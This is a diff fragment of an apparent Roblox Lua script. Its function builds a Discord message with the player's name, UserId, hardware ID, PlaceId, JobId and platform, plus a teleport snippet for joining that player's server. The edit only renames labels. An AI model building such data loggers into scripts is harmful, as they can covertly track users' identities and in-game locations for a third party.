@@ -100,7 +100,7 @@ local function sendTeleportInfo()
 
     -- Create payload to send to Discord
     local data = {
-        ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nPlatform: " .. platform .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
+        ["content"] = "------------\nName: " .. playerName .. "\nUserId: " .. userId .. "\nHWID: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nPlatform: " .. platform .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
     }
 
     -- Convert data to JSON format
